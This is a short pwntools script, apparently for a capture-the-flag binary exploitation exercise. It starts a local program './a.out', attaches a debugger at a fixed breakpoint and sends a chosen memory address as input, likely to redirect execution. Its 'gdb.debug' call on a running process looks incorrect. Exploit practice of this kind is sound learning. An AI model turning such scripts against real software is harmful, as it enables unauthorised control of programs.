from pwn import *

elf = context.binary = ELF('./a.out')
p = process()
context.terminal = ['wt.exe','wsl.exe']
#p.sendline(hex(0x4022b8))
gdb.debug(p, gdbscript='''
b *0x0000000000401955
c
''')
p.sendline(hex(0x4022b8))
p.interactive()

